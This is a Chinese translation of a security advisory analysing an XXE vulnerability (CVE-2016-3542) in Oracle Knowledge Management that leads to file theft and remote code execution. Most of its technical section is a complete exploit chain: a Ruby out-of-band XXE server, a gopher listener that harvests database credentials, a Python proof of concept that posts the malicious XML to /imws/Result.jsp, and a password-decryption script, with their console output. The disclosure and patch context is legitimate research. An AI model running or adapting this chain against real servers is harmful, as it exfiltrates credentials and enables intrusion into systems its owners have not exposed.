
# 【漏洞分析】Oracle知识库管理系统XXE漏洞分析：可导致RCE


                                阅读量   
                                **91169**
                            
                        |
                        
                                                                                                                                    ![](./img/85798/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：securiteam.com
                                <br>原文地址：[https://blogs.securiteam.com/index.php/archives/3052](https://blogs.securiteam.com/index.php/archives/3052)

译文仅供参考，具体内容表达以及含义原文为准

**[![](./img/85798/t0187501fb3716c7f5a.jpg)](./img/85798/t0187501fb3716c7f5a.jpg)**

****

作者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

稿费：60RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**一、漏洞概要**

本文对Oracle知识库管理系统8.5.1发布的公告内容进行分析。

Oracle的InQuira知识库管理产品具备对各种来源的搜索技术，为用户提供了简单方便的获取知识的方法，这些知识普遍隐藏于存储企业内容的各类系统、应用程序以及数据库中。

总而言之，Oracle的知识库管理产品可以帮助用户在公司存储信息中挖掘有用的知识。

<br>

**二、特别鸣谢**

作为一名独立的安全研究员，Steven Seely发现了该产品中存在的漏洞，并将漏洞报告给Beyond Security公司的SecuriTeam安全公告计划。

<br>

**三、厂商响应**

Oracle已针对该漏洞发布了补丁，更多细节可以参考[此链接](http://www.oracle.com/technetwork/security-advisory/cpujul2016-2881720.html)。

<br>

**四、漏洞细节**

存在漏洞的代码位于“/imws/Result.jsp”文件中，攻击者利用该缺陷代码可访问位于第三方服务器中的某个XML文件。第三方服务器受攻击者控制，最终可实现受害者本地服务器上文件的窃取。

我们需要经过以下5个步骤以利用该漏洞（前面两个步骤需要在后台执行）：

1、建立恶意的XML外部实体（XML External Entity，XXE）服务器。

2、监听gopher协议。

3、攻击者窃取“custom.xml”文件。

4、解密或破解AES密码。

5、获取受害者服务器的Shell。

下图反映了此次攻击的步骤以及攻击事件发生的顺序：

[![](./img/85798/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t012ac810e8b4b5f00a.png)

步骤1：建立一个恶意的XML外部实体（XXE）服务器。

```
x@pluto:~/xxe$ ruby xxeserve.rb -o 0.0.0.0
[2015-02-09 16:03:45] INFO  WEBrick 1.3.1
[2015-02-09 16:03:45] INFO  ruby 1.9.3 (2013-11-22) [x86_64-linux]
== Sinatra/1.4.5 has taken the stage on 4567 for development with backup from WEBrick
[2015-02-09 16:03:45] INFO  WEBrick::HTTPServer#start: pid=18862 port=4567
172.16.77.128 - - [09/Feb/2015:16:04:10 +1100] "GET /xml?f=C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml HTTP/1.1" 200 173 0.0089
172.16.77.128 - - [09/Feb/2015:16:04:10 AEDT] "GET /xml?f=C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml HTTP/1.1" 200 173
- -&gt; /xml?f=C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml
```

步骤2：监听gopher协议。

```
x@pluto:~/xxe$ ./gopher.py
starting up on 0.0.0.0 port 1337
waiting for a connection
connection from ('172.16.77.128', 50746)
(+) The database SID is: jdbc:oracle:thin:@WIN-U94QE7O15KE:1521:IM
(+) The database username is: SYS as SYSDBA
(+) The database password is: VO4+OdJq+LXTkmSdXgvCg37TdK9mKftuz2XFiM9mif4=
```

步骤3：窃取“custom.xml”文件。

```
x@pluto:~/xxe$ ./poc.py 
(+) pulling custom.xml for the db password...
(!) Success! please check the gopher.py window!
```

步骤4：解密或破解AES密码。

```
NOTE: you will need to bruteforce the encryption key which is contained in the wallet.
Oracle Knowledge uses 'OracleKnowledge1' as the wallet/keystore password, but you will most likely not have the wallet or keystore in which case a dictionary attack is to be used to find the password.
x@pluto:~/xxe$ ./decrypt.sh VO4+OdJq+LXTkmSdXgvCg37TdK9mKftuz2XFiM9mif4=
(+) Decrypting... "VO4+OdJq+LXTkmSdXgvCg37TdK9mKftuz2XFiM9mif4="
Result: "password"
```

步骤5：获取shell接口：

利用数据库信息，远程登录到数据库并执行代码。

你也可以在服务器系统中找到另一个配置文件，该配置文件可以允许攻击者使用一种更为“直接”的方法获取SYSTEM shell。

xxeserve.rb代码如下：

```
#!/usr/bin/env ruby
# Notes:
# - This is the out of band xxe server that is used to retrieve the file and send it via the gopher protocol
# - ruby xxeserve.rb -o 0.0.0.0
require 'sinatra'
get "/" do
  return "OHAI" if params[:p].nil?
  f = File.open("./files/#{request.ip}#{Time.now.to_i}","w")
  f.write(params[:p])
  f.close
  ""
end
get "/xml" do
  return "" if params[:f].nil?
&lt;&lt;END  
&lt;!ENTITY % payl SYSTEM "file:///#{params[:f]}"&gt;
&lt;!ENTITY % int "&lt;!ENTITY % trick SYSTEM 'gopher://#{request.host}:1337/?%payl;'&gt;"&gt;
END
end
```

gopher.py代码如下：

```
#!/usr/bin/python
# Notes:
# - This code just listens for client requests on port 1337
# - it looks for database strings and prints them out
import socket
import sys
import re
# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind the socket to the port
server_address = ('0.0.0.0', 1337)
print &gt;&gt;sys.stderr, 'starting up on %s port %s' % server_address
sock.bind(server_address)
# Listen for incoming connections
sock.listen(1)
while True:
    # Wait for a connection
    print &gt;&gt;sys.stderr, 'waiting for a connection'
    connection, client_address = sock.accept()
    try:
        print &gt;&gt;sys.stderr, 'connection from', client_address
        # Receive the data in small chunks and retransmit it
        while True:
            data = connection.recv(2048)
            
            if data:
#print data
matchuser = re.search("&lt;user&gt;(.*)&lt;/user&gt;", data)
matchpassword = re.search("&lt;password&gt;(.*)&lt;/password&gt;", data)
matchurl = re.search("&lt;url&gt;(.*)&lt;/url&gt;", data)
if matchuser and matchpassword and matchurl:
print "(+) The database SID is: %s" % matchurl.group(1)
print "(+) The database username is: %s" % matchuser.group(1)
print "(+) The database password is: %s" % matchpassword.group(1)
connection.close()
sys.exit(1)
connection.close()
sys.exit(1)
            else:
                print &gt;&gt;sys.stderr, 'no more data from', client_address
                break
            
    except Exception:
    connection.close()
    finally:
        # Clean up the connection
        connection.close()
```

poc.py代码如下：

```
#!/usr/bin/python
# Notes:
# - This code steals the C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml file via the XXE bug.
# - You need to run ruby xxeserve.rb -o 0.0.0.0 and use an interface ip for the "local xxe server"
# - The code requires a proxy server to be setup on 127.0.0.1:8080 although, this can be changed
import requests
import json
import sys
# burp, ftw
proxies = {
  "http": "http://127.0.0.1:8080",
}
if len(sys.argv) &lt; 3:
print "(+) Usage: %s [local xxe server:port] [target]" % sys.argv[0]
print "(+) Example: %s 172.16.77.1:4567 172.16.77.128" % sys.argv[0]
sys.exit(1)
localxxeserver = sys.argv[1]
target = sys.argv[2]
payload = {'method' : '2', 'inputXml': '''&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY %% remote SYSTEM "http://%s/xml?f=C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml"&gt;
%%remote;
%%int;
%%trick;]&gt;''' % localxxeserver}
url = 'http://%s:8226/imws/Result.jsp' % target
headers = {'content-type': 'application/x-www-form-urlencoded'}
print "(+) pulling custom.xml for the db password..."
r = requests.post(url, data=payload, headers=headers, proxies=proxies)
if r.status_code == 200:
print "(!) Success! please check the gopher.py window!"
```

decrypt.sh代码如下：

```
#!/bin/sh
if [ "$#" -ne 1 ]; then
    echo "(!) Usage: $0 [hash]"
else
    java -classpath "infra_encryption.jar:oraclepki.jar:osdt_core.jar:osdt_cert.jar:commons-codec-1.3.jar" -DKEYSTORE_LOCATION="keystore" com.inquira.infra.security.OKResourceEncryption $1
fi
```

<br>

**五、CVE细节**

[CVE-2016-3542](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-3542)

<br>

**六、受影响产品**

Oracle知识库管理系统12.1.1、12.1.2、12.1.3、12.2.3、12.2.4以及12.2.5版本。
